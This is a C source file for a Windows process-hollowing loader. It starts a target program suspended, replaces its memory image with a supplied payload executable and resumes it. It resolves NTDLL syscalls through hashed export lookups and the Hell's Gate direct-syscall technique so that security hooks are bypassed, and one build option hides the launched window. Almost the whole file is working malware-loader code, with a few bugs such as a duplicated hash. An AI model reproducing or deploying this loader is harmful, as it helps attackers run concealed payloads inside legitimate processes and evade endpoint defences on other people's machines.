#pragma once
#include <Windows.h>
//#include <winternl.h>
#include <stdio.h>
#include "structs.h"
#pragma comment(lib,"ntdll.lib")
#define OBF(str) (djb2(str))

/*--------------------------------------------------------------------
  VX Tables
--------------------------------------------------------------------*/
typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	DWORD64 dwHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {
	VX_TABLE_ENTRY NtAllocateVirtualMemory;
	VX_TABLE_ENTRY NtProtectVirtualMemory;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;

	VX_TABLE_ENTRY NtResumeThread;
	VX_TABLE_ENTRY NtTerminateProcess;
	VX_TABLE_ENTRY NtGetContextThread;
	VX_TABLE_ENTRY NtSetContextThread;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtWriteVirtualMemory;
	VX_TABLE_ENTRY NtReadVirtualMemory;
	VX_TABLE_ENTRY NtQueryInformationProcess;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateProcess;
	VX_TABLE_ENTRY NtCreateUserProcess;
} VX_TABLE, * PVX_TABLE;

/*--------------------------------------------------------------------
  Function prototypes.
--------------------------------------------------------------------*/
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL GetVxTableEntry(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PVX_TABLE_ENTRY pVxTableEntry
);
BOOL Payload(
	_In_ PVX_TABLE pVxTable
);
PVOID VxMoveMemory(
	_Inout_ PVOID dest,
	_In_    const PVOID src,
	_In_    SIZE_T len
);

typedef struct _MINI_PEB
{
	ULONG  Flags;
	LPVOID Mutant;
	LPVOID ImageBaseAddress;
} MINI_PEB, * PMINI_PEB;

/*--------------------------------------------------------------------
  External functions' prototype.
--------------------------------------------------------------------*/
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

PTEB RtlGetThreadEnvironmentBlock() {
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}

PVOID VxMoveMemory(PVOID dest, const PVOID src, SIZE_T len) {
	char* d = dest;
	const char* s = src;
	if (d < s)
		while (len--)
			*d++ = *s++;
	else {
		char* lasts = s + (len - 1);
		char* lastd = d + (len - 1);
		while (len--)
			*lastd-- = *lasts--;
	}
	return dest;
}

DWORD64 djb2(PBYTE str) {
	//NOTE: change this in prod
	DWORD64 dwHash = 0x7734773477347734;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}


BOOL MapNewExecutableRegionInProcess(
	PVX_TABLE pVxTable,
	IN HANDLE TargetProcessHandle,
	IN HANDLE TargetThreadHandle,
	IN LPVOID NewExecutableRawImage);

typedef LONG(WINAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef LONG(WINAPI* NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, LPVOID, ULONG, PULONG);

DWORD_PTR Align(DWORD_PTR Value, DWORD_PTR Alignment)
{
	DWORD_PTR dwResult = Value;

	if (Alignment > 0)
	{
		if ((Value % Alignment) > 0)
			dwResult = (Value + Alignment) - (Value % Alignment);
	}
	return dwResult;
}

//
// based on MemExec64 source by steve10120 [at] ic0de.org
//	clever method of getting contextinformation for entry point data, x64 doesnt give us ThreadContext.Eax
// adaptation for in-mem-exe.c by RageLtMan
// TODO: realistic mem protections 
//
BOOL MapNewExecutableRegionInProcess(
	PVX_TABLE pVxTable,
	IN HANDLE TargetProcessHandle,
	IN HANDLE TargetThreadHandle,
	IN LPVOID NewExecutableRawImage)
{
	PROCESS_INFORMATION       BasicInformation;
	PIMAGE_SECTION_HEADER     SectionHeader;
	PIMAGE_DOS_HEADER         DosHeader;
	PIMAGE_NT_HEADERS         NtHeader64;
	DWORD_PTR                 dwImageBase;
	NtUnmapViewOfSection      pNtUnmapViewOfSection;
	NtQueryInformationProcess pNtQueryInformationProcess;
	ULONG_PTR                 pImageBase;
	SIZE_T                    dwBytesWritten;
	SIZE_T                    dwBytesRead;
	int                       Count;
	PCONTEXT                  ThreadContext = NULL;
	CONTEXT					  ctx;
	PMINI_PEB                 ProcessPeb;
	ULONG                     SizeOfBasicInformation;
	NTSTATUS status = 0x00000000;



	DosHeader = (PIMAGE_DOS_HEADER)NewExecutableRawImage;
	if (DosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	NtHeader64 = (PIMAGE_NT_HEADERS64)((DWORD_PTR)NewExecutableRawImage + DosHeader->e_lfanew);
	if (NtHeader64->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pImageBase = (LPVOID)NtHeader64->OptionalHeader.ImageBase;
	SIZE_T szAlloc = (LPVOID)NtHeader64->OptionalHeader.SizeOfImage;

	RtlSecureZeroMemory(&BasicInformation, sizeof(PROCESS_INFORMATION));
	SIZE_T szThreadContext = sizeof(ThreadContext) + 4;

	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent(
		NtCurrentProcess(),
		&ThreadContext,
		0,
		&szThreadContext,
		MEM_COMMIT, PAGE_READWRITE);
	if (!NT_SUCCESS(status))
		return FALSE;

	ThreadContext = (PCONTEXT)Align((DWORD_PTR)ThreadContext, 4);
	ThreadContext->ContextFlags = CONTEXT_FULL;
	HellsGate(pVxTable->NtGetContextThread.wSystemCall);
	status = HellDescent(TargetThreadHandle, ThreadContext);
	if (!NT_SUCCESS(status))
		return FALSE;

	HellsGate(pVxTable->NtReadVirtualMemory.wSystemCall);
	status = HellDescent(TargetProcessHandle,
		(LPCVOID)(ThreadContext->Rdx + 16),
		&dwImageBase,
		sizeof(DWORD_PTR),
		&dwBytesRead);

	HellsGate(pVxTable->NtUnmapViewOfSection.wSystemCall);
	status = HellDescent(TargetProcessHandle, (LPVOID)NtHeader64->OptionalHeader.ImageBase);

	HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent(
		TargetProcessHandle,
		&pImageBase,
		0,
		&szAlloc,
		0x3000,
		PAGE_EXECUTE_READWRITE);

	if (!pImageBase || (DWORD_PTR)pImageBase != NtHeader64->OptionalHeader.ImageBase)
		return FALSE;

	HellsGate(pVxTable->NtWriteVirtualMemory.wSystemCall);
	status = HellDescent(TargetProcessHandle,
		pImageBase,
		(LPCVOID)NewExecutableRawImage,
		NtHeader64->OptionalHeader.SizeOfHeaders,
		&dwBytesWritten);
	if (!NT_SUCCESS(status))
		return FALSE;

	SectionHeader = IMAGE_FIRST_SECTION(NtHeader64);
	for (Count = 0; Count < NtHeader64->FileHeader.NumberOfSections; Count++) {
		status = HellDescent(TargetProcessHandle,
			(LPVOID)((DWORD_PTR)pImageBase + SectionHeader->VirtualAddress),
			(LPVOID)((DWORD_PTR)NewExecutableRawImage + SectionHeader->PointerToRawData),
			SectionHeader->SizeOfRawData, &dwBytesWritten);
		if (!NT_SUCCESS(status))
			return FALSE;
		SectionHeader++;
	}
	status = HellDescent(TargetProcessHandle,
		(LPVOID)(ThreadContext->Rdx + 16),
		(LPVOID)&NtHeader64->OptionalHeader.ImageBase,
		sizeof(DWORD_PTR),
		&dwBytesWritten);
	if (!NT_SUCCESS(status))
		return FALSE;

	ThreadContext->Rcx = (DWORD_PTR)pImageBase + NtHeader64->OptionalHeader.AddressOfEntryPoint;
	HellsGate(pVxTable->NtSetContextThread.wSystemCall);
	status = HellDescent(TargetThreadHandle, ThreadContext);
	if (!NT_SUCCESS(status))
		return FALSE;

	HellsGate(pVxTable->NtResumeThread.wSystemCall);
	status = HellDescent(TargetThreadHandle, NULL);
	return NT_SUCCESS(status);
}
INT wmain(int argc, WCHAR* argv[]) {

	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return 0x1;

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 0x01;

	VX_TABLE Table = { 0 };

	Table.NtGetContextThread.dwHash = 0x3f0b5053ad7fc233;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtGetContextThread))
		return 0x1;
	Table.NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;

	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtAllocateVirtualMemory))
		return 0x1;

	Table.NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateThreadEx))
		return 0x1;

	Table.NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtProtectVirtualMemory))
		return 0x1;

	Table.NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWaitForSingleObject))
		return 0x1;

	Table.NtResumeThread.dwHash = 0xa5073bcb80d0459f;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtResumeThread))
		return 0x1;

	Table.NtTerminateProcess.dwHash = 0xeae06fc72675531e;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtTerminateProcess))
		return 0x1;

	Table.NtSetContextThread.dwHash = 0xcea61d383ffd88bf;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtSetContextThread))
		return 0x1;

	Table.NtUnmapViewOfSection.dwHash = 0x1fe784ec0bcb745c;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtUnmapViewOfSection))
		return 0x1;

	Table.NtWriteVirtualMemory.dwHash = 0x68a3c2ba486f0741;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtWriteVirtualMemory))
		return 0x1;

	Table.NtReadVirtualMemory.dwHash = 0x3a501544bfe708b2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtReadVirtualMemory))
		return 0x1;

	Table.NtClose.dwHash = 0x3a501544bfe708b2;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtClose))
		return 0x1;

	Table.NtCreateProcess.dwHash = 0xf38a8f70e7585429;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateProcess))
		return 0x1;

	Table.NtCreateUserProcess.dwHash = 0xcc5074955d34eb28;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtCreateUserProcess))
		return 0x1;

	/*Table.NtQueryInformationProcess.dwHash = 0xd902864579da8171;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &Table.NtQueryInformationProcess))
		return 0x1;*/

	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;

	PVOID image = NULL, mem, base;
	DWORD i, read, nSizeOfFile;
	HANDLE hFile;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	CONTEXT ctx;
	NTSTATUS status;


	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (argc != 3)
	{
		puts("Usage: [hollow target path] [payload exe path]");
		return;
	}

	SECURITY_ATTRIBUTES saAttr = {
		sizeof(SECURITY_ATTRIBUTES),
		NULL,
		TRUE
	};

	BOOL inherit = FALSE;
	DWORD createFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE;
#ifndef DEBUG
	si.dwFlags |= STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	createFlags |= CREATE_NO_WINDOW;
#endif

	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(STARTUPINFO);
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;

	if (!CreateProcess(argv[1], NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		puts("Could not create suspended process.");
		return -1;
	}

	//No need to do NtCreateFile because this is just for example. Actual usage would obtain this from elsewhere, such as resources section. 
	hFile = CreateFile(argv[2], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("\nError: Unable to open the replacement executable. CreateFile failed with error %d\n", GetLastError());
		HellsGate((&Table)->NtTerminateProcess.wSystemCall);
		NTSTATUS status = HellDescent(pi.hProcess, 1);
		return -1;
	}

	nSizeOfFile = GetFileSize(hFile, NULL); // Get the size of the replacement executable

	SIZE_T szSizeOfFile = nSizeOfFile;
	HellsGate((&Table)->NtAllocateVirtualMemory.wSystemCall);
	status = HellDescent(
		NtCurrentProcess(),
		&image,
		0,
		&szSizeOfFile,
		MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hFile, image, nSizeOfFile, &read, NULL)) // Read the executable file from disk
	{
		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
		HellsGate((&Table)->NtTerminateProcess.wSystemCall);
		NTSTATUS status = HellDescent(pi.hProcess, 1);
		return;
	}

	NtClose(hFile);
	return MapNewExecutableRegionInProcess(&Table, pi.hProcess, pi.hThread, image);
}



BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pVxTableEntry->dwHash) {
			pVxTableEntry->pAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	return TRUE;
}